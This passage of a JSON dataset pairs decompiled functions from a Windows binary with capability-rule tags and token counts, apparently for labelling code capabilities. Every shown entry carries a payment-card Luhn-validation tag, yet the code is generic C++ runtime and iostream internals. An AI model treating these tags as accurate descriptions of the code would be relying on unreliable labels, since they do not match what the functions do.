        "decompiled_code": "\nvoid fcn.1400adc80(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    puVar3 = *(arg1 + 0x10);\n    if (puVar3 == NULL) {\n        puVar3 = fcn.1400b6520(0x90);\n        *(puVar3 + 1) = 0;\n        *puVar3 = 0x14010b3c0;\n        puVar3[2] = 0;\n        puVar3[3] = 0;\n        *(puVar3 + 4) = 0;\n        puVar3[5] = 0;\n        puVar3[6] = 0;\n        puVar3[7] = 0;\n        puVar3[8] = 0;\n        *(puVar3 + 9) = 0;\n        *(puVar3 + 0x11) = 0;\n        *(arg1 + 0x10) = puVar3;\n    }\n    puVar3[3] = 0;\n    puVar3[2] = 0x1400fd630;\n    *(puVar3 + 4) = 0;\n    *(puVar3 + 9) = 0x2e;\n    *(*(arg1 + 0x10) + 0x49) = 0x2c;\n    iVar1 = **0x140102ba0;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x4a + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar1 = **0x140102b90;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x6e + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x1a);\n    iVar1 = *(arg1 + 0x10);\n    *(iVar1 + 0x28) = 0x1400fd631;\n    *(iVar1 + 0x30) = 4;\n    *(iVar1 + 0x38) = 0x1400fd636;\n    *(iVar1 + 0x40) = 5;\n    return;\n}\n",
        "token_count": 543
    },
    "1400ae04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ae040(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    \n    puVar4 = *(arg1 + 0x10);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.1400b6520(0xd0);\n        *(puVar4 + 1) = 0;\n        *puVar4 = 0x14010b3e0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        *(puVar4 + 9) = 0;\n        *(puVar4 + 0x19) = 0;\n        *(arg1 + 0x10) = puVar4;\n    }\n    uVar2 = *0x1400fd654;\n    puVar4[3] = 0;\n    puVar4[2] = 0x1400fd630;\n    *(puVar4 + 9) = uVar2;\n    piVar3 = *0x140102ba0;\n    *(puVar4 + 4) = 0;\n    iVar1 = *piVar3;\n    iVar5 = 0;\n    do {\n        *(puVar4 + iVar5 * 2 + 0x4c) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x24);\n    iVar1 = **0x140102b90;\n    iVar5 = 0;\n    do {\n        *(puVar4 + iVar5 * 2 + 0x94) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x1a);\n    puVar4[6] = 4;\n    puVar4[5] = 0x1400fd63c;\n    puVar4[7] = 0x1400fd646;\n    puVar4[8] = 5;\n    return;\n}\n",
        "token_count": 524
    },
    "1400ae6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ae6c0(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uint64_t arg1_00;\n    \n    *(arg1 + 0x20) = *(arg1 + 0x20) | arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg1_00 = arg2;\n    if (arg2 == 0) {\n        return;\n    }\n    fcn.1400b6b70();\n    cVar1 = fcn.1400b2600(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b36a0(arg1_00);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b2900(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b39a0(arg1_00);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b2840(arg1_00);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b38e0(arg1_00);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 367
    },
    "1400ae6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ae6e0(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    \n    cVar1 = fcn.1400b2600(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b36a0(arg2);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b2900(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b39a0(arg2);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b2840(arg2);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b38e0(arg2);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 265
    },
    "1400af0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400af0c0(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uint64_t arg1_00;\n    \n    *(arg1 + 0x20) = *(arg1 + 0x20) | arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg1_00 = arg2;\n    if (arg2 == 0) {\n        return;\n    }\n    fcn.1400b6b70();\n    cVar1 = fcn.1400b2660(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b3700(arg1_00);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b2960(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b3a00(arg1_00);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b28a0(arg1_00);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b3940(arg1_00);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 366
    },
    "1400af0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400af0e0(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    \n    cVar1 = fcn.1400b2660(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b3700(arg2);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b2960(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b3a00(arg2);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b28a0(arg2);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b3940(arg2);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 264
    },
    "1400b05f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.1400b05f0(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint8_t *puVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    \n    puVar3 = sub.msvcrt.dll_setlocale(4, 0);\n    uVar1 = *puVar3 - 0x43;\n    if (uVar1 == 0) {\n        uVar1 = puVar3[1];\n    }\n    if (uVar1 == 0) {\n        uVar2 = fcn.14000fb70(arg2, arg3, arg4, &stack0x00000028);\n        return uVar2;\n    }\n    iVar4 = sub.msvcrt.dll_strlen(puVar3);\n    uVar5 = fcn.1400b64f0(iVar4 + 1);\n    sub.msvcrt.dll_memcpy(uVar5, puVar3, iVar4 + 1);\n    sub.msvcrt.dll_setlocale(4, 0x1400fdd67);\n    uVar2 = fcn.14000fb70(arg2, arg3, arg4, &stack0x00000028);\n    sub.msvcrt.dll_setlocale(4, uVar5);\n    fcn.1400b64c0(uVar5);\n    return uVar2;\n}\n",
        "token_count": 315
    },
    "1400b0eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.1400b0eb0(char **arg1, uint16_t *arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int16_t iVar4;\n    uint16_t uVar5;\n    int64_t *piVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint64_t arg2_00;\n    uint16_t *puVar9;\n    int64_t iVar10;\n    uint64_t arg3_00;\n    int64_t iVar11;\n    uchar auStack88 [7];\n    uint8_t uStack81;\n    uchar auStack80 [16];\n    \n    arg3_00 = 0;\n    fcn.14008c770(&uStack81, arg1, 0);\n    uVar8 = uStack81;\n    pcVar7 = *arg1;\n    if (uStack81 == 0) {\ncode_r0x0001400b1043:\n        uVar8 = 4;\n    }\n    else {\n        iVar11 = *(arg1 + *(pcVar7 + -0x18) + 0x10);\n        if ((iVar11 < 1) || (arg3 <= iVar11)) {\n            iVar11 = arg3;\n        }\n        fcn.14009fa10(auStack80, arg1 + *(pcVar7 + -0x18) + 0xd0);\n        piVar6 = fcn.1400b3700(auStack80);\n        fcn.14009fb20(auStack80);\n        piVar1 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n        if (piVar1[2] < piVar1[3]) {\n            uVar5 = *piVar1[2];\n        }\n        else {\n            uVar5 = (**(*piVar1 + 0x48))(piVar1);\n        }\n        iVar11 = iVar11 + -1;\n        if (iVar11 < 1) {\n            uVar8 = uVar5 == 0xffff;\n        }\n        else if (uVar5 != 0xffff) {\n            iVar10 = 0;\n            do {\n                arg3_00 = uVar5;\n                cVar3 = (**(*piVar6 + 0x10))(piVar6, 0x20);\n                if (cVar3 != '\\0') {\n                    pcVar7 = *arg1;\n                    *arg2 = 0;\n                    *(arg1 + *(pcVar7 + -0x18) + 0x10) = 0;\n                    if (iVar10 != 0) {\n                        return pcVar7;\n                    }\n                    goto code_r0x0001400b1043;\n                }\n                puVar9 = arg2 + 1;\n                piVar2 = piVar1[2];\n                iVar10 = iVar10 + 1;\n                *arg2 = uVar5;\n                if (piVar2 < piVar1[3]) {\n                    iVar4 = *piVar2;\n                    piVar1[2] = piVar2 + 1;\n                }\n                else {\n                    iVar4 = (**(*piVar1 + 0x50))(piVar1);\n                }\n                if (iVar4 == -1) {\n                    uVar8 = iVar10 < iVar11;\n                    goto code_r0x0001400b0ff0;\n                }\n                if (piVar1[2] < piVar1[3]) {\n                    uVar5 = *piVar1[2];\n                }\n                else {\n                    uVar5 = (**(*piVar1 + 0x48))(piVar1);\n                }\n                if (iVar10 == iVar11) {\n                    uVar8 = uVar5 == 0xffff;\n                    break;\n                }\n                arg2 = puVar9;\n            } while (uVar5 != 0xffff);\n            uVar8 = iVar10 < iVar11 & uVar8;\ncode_r0x0001400b0ff0:\n            *puVar9 = 0;\n            pcVar7 = *arg1;\n            *(arg1 + *(pcVar7 + -0x18) + 0x10) = 0;\n            if (uVar8 == 0) {\n                return pcVar7;\n            }\n            uVar8 = 2;\n            goto code_r0x0001400b1048;\n        }\n        pcVar7 = *arg1;\n        *arg2 = 0;\n        *(arg1 + *(pcVar7 + -0x18) + 0x10) = 0;\n        uVar8 = (0 < iVar11 & uVar8) * 2 | 4;\n    }\ncode_r0x0001400b1048:\n    iVar11 = *(pcVar7 + -0x18);\n    uVar8 = uVar8 | *(arg1 + iVar11 + 0x20);\n    if (*(arg1 + iVar11 + 0xe8) == 0) {\n        uVar8 = uVar8 | 1;\n    }\n    *(arg1 + iVar11 + 0x20) = uVar8;\n    uVar8 = uVar8 & *(arg1 + iVar11 + 0x1c);\n    arg2_00 = uVar8;\n    if (uVar8 != 0) {\n        pcVar7 = \"basic_ios::clear\";\n        fcn.1400b76e0(\"basic_ios::clear\");\n        fcn.14009fa10(pcVar7, arg2_00 + 0xd0);\n        fcn.1400ad170(auStack88, arg2_00, arg3_00);\n        fcn.14009fb20(auStack88);\n        fcn.1400af0e0(arg2_00, arg3_00);\n        piVar1 = *(arg2_00 + 0xe8);\n        if (piVar1 != NULL) {\n            fcn.14009fa10(auStack88, piVar1 + 7);\n            (**(*piVar1 + 0x10))(piVar1, arg3_00);\n            fcn.14009fb80(piVar1 + 7, arg3_00);\n            fcn.14009fb20(auStack88);\n        }\n        return pcVar7;\n    }\n    return pcVar7;\n}\n",
        "token_count": 1400
    },
    "1400b159": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1590(ulong noname_0, ulong noname_1, ulong *arg3)\n\n{\n    fcn.1400b18e0(noname_0, noname_1, *arg3, arg3[1]);\n    return;\n}\n",
        "token_count": 62
    },
    "1400b15e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400b15e0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1400b6970();\n    return *(iVar1 + 8) & 0xffffff00 | *(iVar1 + 8) != 0;\n}\n",
        "token_count": 64
    },
    "1400b650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b6500(ulong arg1)\n\n{\n    fcn.1400b64f0(arg1);\n    return;\n}\n",
        "token_count": 33
    },
    "1400b699": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.1400b6990(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    ulong *arg1_00;\n    uchar *arg1_01;\n    ulong uVar4;\n    char *pcVar5;\n    uint64_t in_RDX;\n    ulong in_R8;\n    \n    puVar1 = *0x140102a70;\n    *(arg1 + 1) = 0;\n    pcVar3 = *puVar1;\n    if (*puVar1 != 0) {\n        pcVar5 = *0x1400fabe0;\n        pcVar3 = fcn.14000ebe0(*0x1400fabe0);\n        if (pcVar3 != 0) {\n            fcn.14001bf30();\n            puVar1 = *0x140102a70;\n            if (*pcVar5 == '\\0') {\n                pcVar3 = **0x140102a70;\n                if (**0x140102a70 == 0) {\n                    if (*pcVar5 == '\\0') {\n                        if (pcVar5[1] != '\\0') {\ncode_r0x0001400b6a9c:\n                            arg1_01 = fcn.1400b76a0();\n                            if (*puVar1 != 0) {\n                                iVar2 = fcn.14000ebe0(*0x1400fabe0);\n                                if (iVar2 != 0) {\n                                    fcn.14001bf30();\n                                }\n                            }\n                            fcn.14000f000(arg1_01);\n                            arg1_01[1] = 0;\n                            *arg1_01 = 1;\n                            pcVar3 = **0x140102a70;\n                            if (**0x140102a70 != 0) {\n                                pcVar5 = *0x1400fabe0;\n                                pcVar3 = fcn.14000ebe0(*0x1400fabe0);\n                                if (pcVar3 != 0) {\n                                    fcn.14001bf30();\n                                    *(pcVar5 + -0xa0) = 0;\n                                    *(pcVar5 + -0x90) = in_RDX;\n                                    *(pcVar5 + -0x88) = in_R8;\n                                    uVar4 = fcn.1400b05a0();\n                                    *(pcVar5 + -0x80) = uVar4;\n                                    uVar4 = fcn.1400affd0();\n                                    *(pcVar5 + -0x78) = uVar4;\n                                    *(pcVar5 + -0x40) = 0x474e5543432b2b00;\n                                    *(pcVar5 + -0x38) = 0x140019770;\n                                    return pcVar5 + -0xa0;\n                                }\n                            }\n                            return pcVar3;\n                        }\ncode_r0x0001400b6a00:\n                        pcVar5[1] = '\\x01';\n                        pcVar3 = 0x1;\n                    }\n                    return pcVar3;\n                }\n                fcn.14000e8c0(0x1400fc330, 0x14001a4f0);\n                in_RDX = *puVar1;\n                pcVar3 = *0x1400fabe0;\n                if (*puVar1 != 0) goto code_r0x0001400b6a40;\n                if (*pcVar5 == '\\0') {\n                    do {\n                        if (pcVar5[1] == '\\0') goto code_r0x0001400b6a00;\n                        fcn.1400b76a0();\ncode_r0x0001400b6a40:\n                        iVar2 = fcn.14000eb20(pcVar3);\n                        if (iVar2 != 0) {\n                            arg1_00 = fcn.1400b6600(8);\n                            in_R8 = 0x14001bb60;\n                            in_RDX = 0x1401046c0;\n                            *arg1_00 = 0x1401090f0;\n                            fcn.1400b6bc0(arg1_00, 0x1401046c0, 0x14001bb60);\n                            goto code_r0x0001400b6a97;\n                        }\n                    } while (*pcVar5 == '\\0');\n                    if (*puVar1 != 0) {\n                        iVar2 = fcn.14000ebe0(*0x1400fabe0);\n                        if (iVar2 != 0) {\ncode_r0x0001400b6a97:\n                            fcn.14001bf30();\n                            goto code_r0x0001400b6a9c;\n                        }\n                    }\n                }\n            }\n            return NULL;\n        }\n    }\n    return pcVar3;\n}\n",
        "token_count": 1067
    },
    "1400b6ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b6ad0(uchar *arg1)\n\n{\n    uint64_t uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong in_RDX;\n    ulong in_R8;\n    \n    arg1[1] = 0;\n    *arg1 = 1;\n    uVar1 = **0x140102a70;\n    if (**0x140102a70 != 0) {\n        iVar3 = *0x1400fabe0;\n        uVar1 = fcn.14000ebe0(*0x1400fabe0);\n        if (uVar1 != 0) {\n            fcn.14001bf30();\n            *(iVar3 + -0xa0) = 0;\n            *(iVar3 + -0x90) = in_RDX;\n            *(iVar3 + -0x88) = in_R8;\n            uVar2 = fcn.1400b05a0();\n            *(iVar3 + -0x80) = uVar2;\n            uVar2 = fcn.1400affd0();\n            *(iVar3 + -0x78) = uVar2;\n            *(iVar3 + -0x40) = 0x474e5543432b2b00;\n            *(iVar3 + -0x38) = 0x140019770;\n            return iVar3 - 0xa0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 320
    },
    "1400b6b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400b6b10(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + -0xa0) = 0;\n    *(arg1 + -0x90) = arg2;\n    *(arg1 + -0x88) = arg3;\n    uVar1 = fcn.1400b05a0();\n    *(arg1 + -0x80) = uVar1;\n    uVar1 = fcn.1400affd0();\n    *(arg1 + -0x78) = uVar1;\n    *(arg1 + -0x40) = 0x474e5543432b2b00;\n    *(arg1 + -0x38) = 0x140019770;\n    return arg1 + -0xa0;\n}\n",
        "token_count": 189
    },
    "1400b6bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.1400b6bc0(ulong arg1, ulong arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t *piVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    int64_t in_R9;\n    int64_t iStack128;\n    ulong uStack120;\n    ulong uStack112;\n    int64_t *piStack88;\n    ulong uStack80;\n    int64_t *piStack72;\n    \n    iVar3 = fcn.1400b6970();\n    *(iVar3 + 8) = *(iVar3 + 8) + 1;\n    uVar6 = arg2;\n    piVar8 = arg3;\n    puVar4 = fcn.1400b6b10(arg1, arg2, arg3);\n    *puVar4 = 1;\n    piStack88 = puVar4 + 0x18;\n    fcn.14000efc0(piStack88);\n    piVar5 = piStack88;\n    fcn.1400b6670(piStack88);\n    fcn.1400b2e40();\n    if (piVar5 != NULL) {\n        piVar7 = *(*piVar5 + -0x10) + piVar5;\n        piVar1 = *(*piVar5 + -8);\n        iStack128 = 0;\n        uStack112 = 0x1000000000;\n        uStack120 = 0;\n        if ((*(*piVar7 + -8) == piVar1) &&\n           (uStack80 = arg2,  piStack72 = arg3, \n           (**(*piVar1 + 0x38))(piVar1, in_R9, 6, piVar8, piVar7, uVar6, piVar5, &iStack128),  iStack128 != 0)) {\n            if ((uStack112 & 6) == 6) {\n                return iStack128;\n            }\n            if ((uStack120 & uStack120._4_4_ & 6) == 6) {\n                return iStack128;\n            }\n            if (((uStack120._4_4_ & 5) != 4) && (uStack112 == 0)) {\n                if (in_R9 < 0) {\n                    if ((in_R9 != -2) &&\n                       (uVar2 = (**(*piVar8 + 0x40))(piVar8, in_R9, iStack128, uVar6, piVar5),  (uVar2 & 6) == 6)) {\n                        return iStack128;\n                    }\n                }\n                else if (piVar5 == iStack128 + in_R9) {\n                    return iStack128;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 662
    },
    "1400b6f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b6f80(void)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    ulong uVar3;\n    \n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x140103570 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x1401063b0, fcn.1400ae670);\n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x140103410 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140105da0, 0x14009c030);\n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x140103500 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140106200, 0x1400ac470);\n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x1401031f0 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140105490, 0x140078c20);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007acc0(uVar2, piVar1);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105610, fcn.14007ae90);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007cca0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056a0, 0x14007ce20);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.1400989d0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105b50, 0x140098b50);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007ce90(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056c0, 0x14007d010);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007d080(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056e0, 0x14007d200);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14008fdf0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105850, fcn.14008ffc0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007af40(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105630, 0x14007b0c0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.140095120(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401059b0, 0x1400952a0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.140097680(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105af0, 0x140097800);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    if (*0x1400f9760 == '\\0') {\n        *0x1400f9760 = '\\x01';\n    }\n    if (*0x1400f9780 == '\\0') {\n        *0x1400f9780 = '\\x01';\n    }\n    if (*0x1400f9820 == '\\0') {\n        *0x1400f9820 = '\\x01';\n    }\n    if (*0x1400f9840 == '\\0') {\n        *0x1400f9840 = '\\x01';\n    }\n    if (*0x1400f95e0 == '\\0') {\n        *0x1400f95e0 = '\\x01';\n    }\n    if (*0x1400f95f0 == '\\0') {\n        *0x1400f95f0 = '\\x01';\n    }\n    if (*0x1400f97c0 == '\\0') {\n        *0x1400f97c0 = '\\x01';\n    }\n    if (*0x1400f9620 == '\\0') {\n        *0x1400f9620 = '\\x01';\n    }\n    if (*0x1400f9800 == '\\0') {\n        *0x1400f9800 = '\\x01';\n    }\n    if (*0x1400f97e0 == '\\0') {\n        *0x1400f97e0 = '\\x01';\n    }\n    if (*0x1400f97a0 == '\\0') {\n        *0x1400f97a0 = '\\x01';\n    }\n    if (*0x1400f9740 == '\\0') {\n        *0x1400f9740 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 1518
    },
    "1400b6fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b6fc0(void)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    ulong uVar3;\n    \n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x140103410 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140105da0, 0x14009c030);\n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x140103500 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140106200, 0x1400ac470);\n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x1401031f0 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140105490, 0x140078c20);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007acc0(uVar2, piVar1);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105610, fcn.14007ae90);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007cca0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056a0, 0x14007ce20);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.1400989d0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105b50, 0x140098b50);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007ce90(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056c0, 0x14007d010);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007d080(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056e0, 0x14007d200);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14008fdf0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105850, fcn.14008ffc0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007af40(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105630, 0x14007b0c0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.140095120(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401059b0, 0x1400952a0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.140097680(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105af0, 0x140097800);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    if (*0x1400f9760 == '\\0') {\n        *0x1400f9760 = '\\x01';\n    }\n    if (*0x1400f9780 == '\\0') {\n        *0x1400f9780 = '\\x01';\n    }\n    if (*0x1400f9820 == '\\0') {\n        *0x1400f9820 = '\\x01';\n    }\n    if (*0x1400f9840 == '\\0') {\n        *0x1400f9840 = '\\x01';\n    }\n    if (*0x1400f95e0 == '\\0') {\n        *0x1400f95e0 = '\\x01';\n    }\n    if (*0x1400f95f0 == '\\0') {\n        *0x1400f95f0 = '\\x01';\n    }\n    if (*0x1400f97c0 == '\\0') {\n        *0x1400f97c0 = '\\x01';\n    }\n    if (*0x1400f9620 == '\\0') {\n        *0x1400f9620 = '\\x01';\n    }\n    if (*0x1400f9800 == '\\0') {\n        *0x1400f9800 = '\\x01';\n    }\n    if (*0x1400f97e0 == '\\0') {\n        